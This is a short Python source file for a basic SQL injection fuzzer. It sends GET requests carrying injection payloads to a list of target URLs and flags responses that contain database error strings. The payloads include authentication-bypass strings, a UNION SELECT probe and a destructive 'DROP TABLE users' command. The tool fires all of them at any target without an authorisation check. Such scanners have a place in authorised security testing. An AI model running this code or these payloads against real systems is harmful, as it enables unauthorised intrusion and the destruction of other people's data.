import requests

class SQLFuzzer:
    def __init__(self):
        self.name = "SQL Injection Fuzzer"
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL, NULL--"
        ]
        self.error_signatures = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-01756",
            "SQLite3::SQLException",
            "you have an error in your sql syntax",
            "Warning: pg_",
            "unterminated quoted string",
            "syntax error"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                test_url = f"{target}?test={payload}"
                status, response_text = self.send_request(test_url)
                is_vulnerable = self.analyze_response(response_text)
                results[test_url] = {
                    "status": status,
                    "vulnerable": is_vulnerable
                }
        return results

    def send_request(self, url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:500]  # Skraćeni sadržaj za analizu
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        lower_text = text.lower()
        for sig in self.error_signatures:
            if sig.lower() in lower_text:
                return True
        return False
